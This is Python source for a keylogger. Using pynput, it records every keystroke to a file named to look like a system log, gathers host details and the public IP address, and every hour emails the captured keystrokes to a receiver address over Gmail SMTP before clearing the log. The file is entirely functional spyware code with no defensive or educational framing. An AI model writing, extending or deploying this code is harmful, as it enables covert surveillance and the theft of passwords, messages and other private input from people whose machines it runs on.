from pynput.keyboard import Listener, Key
import logging
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import threading
import time
import os
from cryptography.fernet import Fernet
import platform
import requests

LOG_FILE = "system_log.txt"  
EMAIL_INTERVAL = 60 * 60  
SMTP_SERVER = "smtp.gmail.com"  
SMTP_PORT = 587 
EMAIL_ADDRESS = "your_email@gmail.com"  
EMAIL_PASSWORD = "your_password"  
RECEIVER_EMAIL = "receiver_email@gmail.com"  
ENCRYPTION_KEY = Fernet.generate_key()  

cipher_suite = Fernet(ENCRYPTION_KEY)

def encrypt_data(data):
    return cipher_suite.encrypt(data.encode())

def decrypt_data(encrypted_data):
    return cipher_suite.decrypt(encrypted_data).decode()

def get_system_info():
    system_info = {
        "system": platform.system(),
        "node": platform.node(),
        "release": platform.release(),
        "version": platform.version(),
        "machine": platform.machine(),
        "processor": platform.processor(),
        "ip": requests.get('https://api.ipify.org').text
    }
    return system_info

def write_to_log(key_data):
    with open(LOG_FILE, "a") as f:
        f.write(key_data + "\n")

def send_email():
    while True:
        time.sleep(EMAIL_INTERVAL)
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                log_content = f.read()
            
            if log_content:
                msg = MIMEMultipart()
                msg['From'] = EMAIL_ADDRESS
                msg['To'] = RECEIVER_EMAIL
                msg['Subject'] = "Keylogger Report"
                
                system_info = get_system_info()
                info_str = "\n".join(f"{k}: {v}" for k, v in system_info.items())
                
                body = f"System Info:\n{info_str}\n\nKeystrokes:\n{log_content}"
                msg.attach(MIMEText(body, 'plain'))
                
                encrypted_msg = encrypt_data(body)
                
                try:
                    server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
                    server.starttls()
                    server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
                    server.sendmail(EMAIL_ADDRESS, RECEIVER_EMAIL, encrypted_msg)
                    server.quit()
                    
                    open(LOG_FILE, "w").close()
                except Exception as e:
                    write_to_log(f"Email error: {str(e)}")

def on_press(key):
    try:
        current_key = str(key.char)
    except AttributeError:
        if key == Key.space:
            current_key = " [SPACE] "
        elif key == Key.enter:
            current_key = " [ENTER]\n"
        elif key == Key.backspace:
            current_key = " [BACKSPACE] "
        elif key == Key.tab:
            current_key = " [TAB] "
        elif key == Key.esc:
            current_key = " [ESC] "
        else:
            current_key = f" [{str(key)}] "
    
    write_to_log(current_key)

if __name__ == "__main__":
    system_info = get_system_info()
    write_to_log("\n=== System Information ===")
    for k, v in system_info.items():
        write_to_log(f"{k}: {v}")
    write_to_log("=== Keystroke Log ===\n")
    
    email_thread = threading.Thread(target=send_email)
    email_thread.daemon = True
    email_thread.start()
    
    with Listener(on_press=on_press) as listener:
        listener.join()
